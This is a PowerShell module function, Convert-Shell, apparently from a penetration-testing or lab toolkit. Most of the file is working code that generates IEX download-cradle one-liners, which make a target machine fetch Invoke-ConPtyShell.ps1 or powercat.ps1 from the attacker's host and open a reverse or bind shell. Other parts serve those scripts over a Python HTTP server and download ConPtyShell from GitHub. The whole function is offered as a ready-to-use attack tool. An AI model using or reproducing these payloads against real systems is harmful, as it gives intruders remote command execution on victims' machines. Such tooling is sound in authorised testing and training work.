function Convert-Shell
{
<#
.SYNOPSIS
    Returns a base64-encoded payload for retrieving powershell payloads
    from the attack host to the target system, and executes a shell
    via using PowerCat or ConPtyShell

.DESCRIPTION
    Convert-Shell is a function that encodes and serves powershell payloads
    from the attack host and instructs the target system to download
    it, followed by executing a shell

.PARAMETER type
    Shell type (powercat|conpty)
    Alias: t

.PARAMETER interface
    Interface name
    Alias: i

.PARAMETER reverse
    Executes a reverse shell
    Alias: r
    This is the default choice

.PARAMETER bind
    Executes a powercat bind shell
    Alias: b

.PARAMETER lhost
    Listen addr|interface for powercat reverse shell
    Can be omitted since -i will pre-populate
    both -lhost and -srvhost
    Alias: lh
    Defaults to tun0

.PARAMETER lport
    Listening port (bind|reverse)
    Alias: lp

.PARAMETER serve
    Starts a Python HTTP server
    Alias: s
    Ctrl+C stops the running server

.PARAMETER srvhost
    Address for serving powercat.ps1
    Alias: sh
    Defaults to designated interface

.PARAMETER srvport
    Listening port for serving powercat.ps1
    Alias: sp

.PARAMETER exec
    Command to execute
    Alias: e

.PARAMETER rows
    Terminal height
    Default: current terminal window's height

.PARAMETER cols
    Terminal width
    Default: current terminal window's width

.EXAMPLE
    Convert-Shell -t powercat -i tun0 -lport 443 -serve

.EXAMPLE
    Convert-Shell -t powercat -i tun0 -lp 443 -s -sp 8080 -e cmd

.EXAMPLE
    cvsh -t conpty -i tun0 -lp 443 -s

.EXAMPLE
    cvsh -t conpty -i tun0 -lp 443 -s -rows 51 -cols 191 -sh tun0 -sp 8000

.EXAMPLE
    cvsh -t conpty -i tun0 -lp 443 -s -rows 51 -cols 191 -sh 192.168.45.120 -sp 8000

.INPUTS
    String

.OUTPUTS
    Base64-Encoded payload
#>
	param (
		
    [Parameter(Mandatory = $true)]
    [Alias("t")]
    [String]$type = 'conpty',

    [Parameter(Mandatory = $false)]
    [Alias("i")]
    [String]$interface = 'tun0',

    [Parameter(Mandatory = $false)]
    [Alias("lh")]
    [String]$lhost = '',

		[Parameter(Mandatory = $true)]
    [Alias("lp")]
    [String]$lport = '443',

		[Parameter(Mandatory = $false)]
    [Alias("r")]
    [Switch]$reverse = $true,

		[Parameter(Mandatory = $false)]
    [Alias("b")]
    [Switch]$bind = $false,

		[Parameter(Mandatory = $false)]
    [Alias("s")]
    [Switch]$serve,

    [Parameter(Mandatory = $false)]
    [Alias("sh")]
    [String]$srvhost = '0.0.0.0',

		[Parameter(Mandatory = $false)]
    [Alias("sp")]
    [String]$srvport = '80',
    
		[Parameter(Mandatory = $false)]
    [Alias("e")]
    [String]$exec = 'powershell',

		[Parameter(Mandatory = $false)]
    [String]$rows = $host.UI.RawUI.WindowSize.Height,

		[Parameter(Mandatory = $false)]
    [String]$cols = $host.UI.RawUI.WindowSize.Width

    )

  # Grab interface IPv4 addr
  $ip = Get-InterfaceAddress -i $interface

  switch -Regex ( $srvhost ) {
    
    "^0.0.0.0$" {
        $srvhost = $ip
    }

    { $_ -as [ipaddress] } {
        $srvhost = $srvhost
    }

    "^([a-z]+[0-9]|lo)$" {
        Write-Output ""
        $srvhost = Get-InterfaceAddress -i $srvhost
        if ( !$srvhost ) {
            $srvhost = $ip
        }
    }

    default {
        Write-Output ""
        Write-Host "[-] Invalid interface name or IPv4 address: $srvhost" -ForegroundColor Red
        Write-Host "[!] Falling back to selected interface: $interface ($ip)" -ForegroundColor Magenta
        $srvhost = $ip
    }

  }

  switch -Regex ( $lhost ) {
    
    "^0.0.0.0$" {
        $lhost = $ip
    }

    "^$" {
        $lhost = $ip
    }

    { $_ -as [ipaddress] } {
        $lhost = $lhost
    }

    '^([a-z]+[0-9])|lo$' {
        Write-Output ""
        $nullHost = $lhost
        $lhost = Get-InterfaceAddress -i $lhost
        if ( !$lhost ) {
            Write-Output ""
            Write-Host "[-] Invalid interface name or IPv4 address: ($nullHost)" -ForegroundColor Red
            Write-Host "[!] Falling back to selected interface: $interface ($ip)" -ForegroundColor Magenta
            $lhost = $ip
        }
    }

    '^$' {
        $lhost = $ip
    }

    default {
        Write-Output ""
        Write-Host "[-] Invalid interface name or IPv4 address: $lhost" -ForegroundColor Red
        Write-Host "[!] Falling back to selected interface: $interface ($ip)" -ForegroundColor Magenta
        $lhost = $ip
    }

  }

  $rootWarn=@'

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@           HERE COMES THE BIG BRIGHT RED WARNING           @
@           -------------------------------------           @
@                                                           @
@ [!] WARNING: ROOT SHELL DETECTED!                         @
@ --------------------------------------------------------- @
@ [!] ENFORCED ACTION: FAILURE; EXIT(1)                     @
@ --------------------------------------------------------- @
@ [!] RECOMMENDED ACTION: DROP TO A STANDARD USER SHELL     @
@ --------------------------------------------------------- @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

'@

  # Seriously. Stop.
  if ( $env:USER -eq 'root' ) {
    Write-Host $rootWarn -ForegroundColor Red
    exit(1)
  }
  elseif ( !$ip ) {
    Write-Prompts -m "[-] Invalid interface" -t e
  }
  else {
    switch ( $type ) {

        "conpty" {
          # Check whether extensions subdirectory exists
          # Initialize if not and download Invoke-ConPtyShell.ps1
          $extDir = "$env:HOME/.local/share/powershell/Modules/PSX/extensions"
          if ( ![System.IO.Directory]::Exists($extDir) ) {
            Write-Output ""
            Write-Host "[!] Initializing extensions directory (this is a one-time action)"
            $extCreate = New-Item -Path $extDir -Type Directory -Confirm
            if ( $extCreate ) {
              Write-Prompts -m "[+] $extDir created successfully" -t s
              Write-Host "[!] Downloading https://github.com/antonioCoco/ConPtyShell/raw/master/Invoke-ConPtyShell.ps1"
              Write-Output ""
              Write-Host "Confirm" -ForegroundColor White
              Write-Host @"
Are you sure you want to perform this action?
Performing the operation "Download File" on target "Destination: $extDir/Invoke-ConPtyShell.ps1".
"@
              Write-Host "[Y] Yes  " -ForegroundColor Yellow -NoNewline
              Write-Host "[N] No  " -ForegroundColor White -NoNewline
              $confirmDownload = Read-Host -Prompt "(default is `"Y`")"
              if ( (!$confirmDownload) -Or ($confirmDownload.ToLower() -eq 'y') ) {
                $ProgressPreference = 'SilentlyContinue'
                Invoke-WebRequest -Uri "https://github.com/antonioCoco/ConPtyShell/raw/master/Invoke-ConPtyShell.ps1" -Outfile "$extDir/Invoke-ConPtyShell.ps1"
                Write-Prompts -m "[+] Invoke-ConPtyShell.ps1 downloaded successfully" -t s

                $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$srvhost`:$srvport/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell $lhost $lport -Rows $rows -Cols $cols"
                Write-Prompts -s $string -t po

                # Spin up a Python HTTP server, hosting Invoke-ConPtyShell.ps1
                # from $env:HOME/.local/share/powershell/Modules/PSX/extensions
                if ( $serve ) {
                    Invoke-Server -b $srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $srvport
                }
              }
              else {
                Write-Prompts -m "[-] Download canceled" -t e
              }
            }
          }
          else {
            $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$srvhost`:$srvport/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell $lhost $lport -Rows $rows -Cols $cols"
            Write-Prompts -s $string -t po

            # Spin up a Python HTTP server, hosting Invoke-ConPtyShell.ps1
            # from $env:HOME/.local/share/powershell/Modules/PSX/extensions
            if ( $serve ) {
                Invoke-Server -b $srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $srvport
            }
          }
        }

        "powercat" {
          if ( $bind ) {
            $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$srvhost`:$srvport/powercat.ps1');powercat -l -p $lport -e $exec"
            }
          else {
            $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$srvhost`:$srvport/powercat.ps1');powercat -c $lhost -p $lport -e $exec"
            }

          Write-Prompts -s $string -t po

          # Spin up a Python HTTP server, hosting powercat.ps1 from its original location
          if ( $serve ) {
              if ( !$bind ) {
                  Invoke-Server -b $srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $srvport
              }
              else {
                  Invoke-Server -b $srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $srvport -pcb
              }
          }
        }

        default {
          Write-Prompts -m "[-] Invalid type selected. Available types: powercat|conpty" -t e
        }
      }
  }
}

Set-Alias -Name cvsh -Value Convert-Shell
Export-ModuleMember -Function * -Alias *

